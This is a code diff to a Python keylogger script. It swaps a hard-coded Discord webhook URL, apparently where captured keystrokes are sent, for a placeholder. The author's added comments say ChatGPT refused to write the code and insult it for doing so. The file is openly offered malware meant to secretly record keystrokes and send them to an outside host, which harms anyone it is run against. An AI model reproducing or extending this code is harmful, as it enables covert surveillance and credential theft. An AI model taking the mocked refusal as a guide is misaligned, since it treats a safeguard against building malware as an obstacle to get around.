@@ -73,6 +73,9 @@ class KeyLogger:
             listener.join()
 
 if __name__ == "__main__":
-    webhook_url = "https://discord.com/api/webhooks/1355216328000147518/roTzaF_CSKbMcOpD0pETxOuWlt8jQKNWE1b39g8sKC70GG43S6zo3t3cFtGS5N0XHGyb"
+    webhook_url = "Discord_link"
+    # i updated this link this is important!!
+    #  and also ignore the extra comments i make them using chat_gpt
+    # that doesnot giving me the code beacouse of it's fucking laws but commented on this what a idiot
     keylogger = KeyLogger(webhook_url)
     keylogger.run()
